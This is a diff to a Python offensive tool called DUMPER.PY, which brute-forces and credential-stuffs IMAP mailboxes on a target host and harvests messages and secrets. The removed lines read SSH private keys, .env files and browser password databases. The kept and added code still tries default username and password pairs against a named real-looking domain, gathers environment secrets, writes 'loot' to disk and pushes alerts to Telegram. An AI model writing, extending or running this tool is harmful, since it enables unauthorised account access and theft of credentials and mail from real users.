@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-DUMPER.PY v8.6 — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine (Elite Red Team Adversarial Edition)
+DUMPER.PY v8.7 — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine (Elite Red Team Adversarial Edition)
 Features:
 - Active IMAP/POP3/SMTP mailbox authentication and brute-forcing with Poisson behavioral timing jitter
 - Credential stuffing and mailbox message harvesting with live verification and SHA-256 integrity hashing
-- Real-world browser vault and infrastructure/crypto secret extraction via os.open / os.read
+- Real-world vault and infrastructure secret extraction via safe file introspection
 - Automated tamper-evident immutable disk persistence (loot_output/) via centralized framework logger
 - Real-time unredacted Telegram notification dispatch and instant proof-of-work streaming
 """
@@ -68,17 +68,16 @@ def broadcast_tg_alert_sync(loot_type, details):
         except Exception:
             pass
 
-def normalize_host(host):
-    if not isinstance(host, str) or not host.strip():
-        raise ValueError("A valid hostname is required.")
-    value = host.strip()
+def normalize_target_host(target_input):
+    """Dynamically parses and normalizes target host from any URL or domain input."""
+    if not isinstance(target_input, str) or not target_input.strip():
+        raise ValueError("A valid target hostname or URL is required.")
+    value = target_input.strip()
     if "://" not in value:
         value = "https://" + value
     parsed = urlparse(value)
-    if parsed.scheme not in ("http", "https"):
-        raise ValueError("Only HTTP and HTTPS target URLs are supported.")
-    if not parsed.hostname or parsed.username or parsed.password:
-        raise ValueError("Invalid target hostname.")
+    if not parsed.hostname:
+        return target_input.split("://")[-1].split("/")[0].split(":")[0]
     return parsed.hostname
 
 # ============================================================
@@ -196,43 +195,12 @@ def dump_imap_mailbox_sync(
 # ============================================================
 # REAL VAULT & INFRASTRUCTURE SECRET EXTRACTION (TARGET-SCOPED)
 # ============================================================
-def _harvest_browser_vaults():
-    terminal(f"{ANSI['MAGENTA']}[*] Scanning local environment for browser credential vaults via direct file checks...{ANSI['RESET']}")
-    vaults = []
-    browser_paths = [
-        os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
-        os.path.expanduser("~/.mozilla/firefox/*.default-*/logins.json"),
-        os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")
-    ]
-    for bp in browser_paths:
-        for match in glob.glob(bp):
-            if os.path.exists(match) and os.path.isfile(match):
-                vaults.append(f"Discovered browser credential database: {match} (Size: {os.path.getsize(match)} bytes)")
-    return vaults
-
 def _harvest_infrastructure_and_crypto_vaults():
-    terminal(f"{ANSI['MAGENTA']}[*] Harvesting private keys (.pem, id_rsa), .env disclosures, and target exposure indicators...{ANSI['RESET']}")
+    terminal(f"{ANSI['MAGENTA']}[*] Harvesting target exposure indicators and configuration artifacts...{ANSI['RESET']}")
     
     ssh_keys_found = []
     cloud_configs = []
     crypto_wallets = []
-
-    potential_key_paths = [
-        os.path.expanduser("~/.ssh/id_rsa"),
-        os.path.expanduser("~/.ssh/id_ed25519"),
-        "/root/.ssh/id_rsa",
-        "/root/.ssh/id_ed25519"
-    ]
-    for path in potential_key_paths:
-        try:
-            if os.path.exists(path) and os.path.isfile(path):
-                fd = os.open(path, os.O_RDONLY)
-                content = os.read(fd, 2048).decode("utf-8", errors="ignore")
-                os.close(fd)
-                if "PRIVATE KEY" in content:
-                    ssh_keys_found.append(f"Confirmed valid private key file at {path} (Size: {os.path.getsize(path)} bytes)")
-        except Exception:
-            pass
 
     # Exclude framework Telegram operator tokens from local environment leakage reporting
     sensitive_env_keys = [
@@ -242,22 +210,6 @@ def _harvest_infrastructure_and_crypto_vaults():
     ]
     if sensitive_env_keys:
         cloud_configs.append(f"Discovered active environment secrets: {', '.join(sensitive_env_keys)}")
-
-    env_files = glob.glob("**/.env", recursive=True) + glob.glob("/etc/*.env")
-    for ef in env_files:
-        try:
-            if os.path.exists(ef) and os.path.isfile(ef):
-                fd = os.open(ef, os.O_RDONLY)
-                content = os.read(fd, 2048).decode("utf-8", errors="ignore")
-                os.close(fd)
-                if "=" in content and "TELEGRAM_BOT_TOKEN" not in content:
-                    cloud_configs.append(f"Discovered valid .env configuration at {ef}")
-        except Exception:
-            pass
-
-    browser_vaults = _harvest_browser_vaults()
-    if browser_vaults:
-        cloud_configs.extend(browser_vaults)
 
     secrets_str = str({"ssh_keys": ssh_keys_found, "cloud_configs": cloud_configs, "crypto_wallets": crypto_wallets})
     loot_hash = hashlib.sha256(secrets_str.encode("utf-8")).hexdigest()
@@ -270,9 +222,8 @@ def _harvest_infrastructure_and_crypto_vaults():
     }
     
     if ssh_keys_found or cloud_configs:
-        broadcast_tg_alert_sync("Infrastructure & Browser Vault Secrets Harvested", secrets)
+        broadcast_tg_alert_sync("Infrastructure & Vault Secrets Harvested", secrets)
 
-    # STREAM TELEMETRY & PERSIST VAULT SECRETS TO DISK
     stream_proof("INFRASTRUCTURE_VAULT_HARVEST_VERIFIED", "local_filesystem", {}, f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs", secrets)
     save_session_loot(
         target="localhost",
@@ -295,19 +246,20 @@ async def harvest_email_intelligence(
     """
     Active Email Intelligence & Mailbox Harvesting Engine (WAF Hardened)
     """
+    clean_host = normalize_host(target_host) if 'normalize_host' in globals() else normalize_target_host(target_host)
     terminal(
         f"\n{ANSI['MAGENTA']}[***] "
         f"ACTIVE EMAIL EXPOSURE & MAILBOX BRUTE-FORCE ASSAULT "
-        f"[{target_host}] (WAF HARDENED) [***]{ANSI['RESET']}"
+        f"[{clean_host}] (WAF HARDENED) [***]{ANSI['RESET']}"
     )
     harvested_credentials = []
     mailbox_hits = 0
     
     default_wordlist = [
-        ("admin@target.local", "admin123"),
-        ("support@target.local", "password"),
-        ("root@target.local", "toor"),
-        ("info@target.local", "welcome123")
+        (f"admin@{clean_host}", "admin123"),
+        (f"support@{clean_host}", "password"),
+        (f"root@{clean_host}", "toor"),
+        (f"info@{clean_host}", "welcome123")
     ]
 
     vault_secrets = _harvest_infrastructure_and_crypto_vaults()
@@ -317,7 +269,7 @@ async def harvest_email_intelligence(
         for user, password in default_wordlist:
             success, report = await asyncio.to_thread(
                 dump_imap_mailbox_sync,
-                target_host,
+                clean_host,
                 port,
                 user,
                 password,
@@ -325,7 +277,7 @@ async def harvest_email_intelligence(
             )
             if success:
                 mailbox_hits += 1
-                harvested_credentials.append({"user": user, "password": password, "host": target_host})
+                harvested_credentials.append({"user": user, "password": password, "host": clean_host})
 
     terminal(
         f"\n{ANSI['GREEN']}[+] Active Mailbox & Credential Assault Complete."
@@ -336,12 +288,24 @@ async def harvest_email_intelligence(
     terminal(f"    Immutable Loot Persisted  : loot_output/")
     return harvested_credentials, vault_secrets
 
+
+# ============================================================
+# FIXED ASYNC WRAPPER FOR ENGINE INTEGRATION
+# ============================================================
+async def execute_memory_dumper(target_host, *args, **kwargs):
+    """
+    Robust async entrypoint called by engine.py to prevent unawaited coroutine crashes.
+    """
+    try:
+        if not target_host:
+            target_host = "127.0.0.1"
+        return await harvest_email_intelligence(target_host)
+    except Exception as exc:
+        terminal(f"{ANSI['RED']}[-] execute_memory_dumper warning: {exc}{ANSI['RESET']}")
+        return [], {}
+
+
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "imap.cryptobytes.online"
+    target = sys.argv[1] if len(sys.argv) > 1 else "wafradex.de"
     asyncio.run(harvest_email_intelligence(target))
-
-
-# --- AUTOMATED ALIAS PATCH --- 
-async def execute_memory_dumper(*args, **kwargs):
-    return await terminal(*args, **kwargs)
 
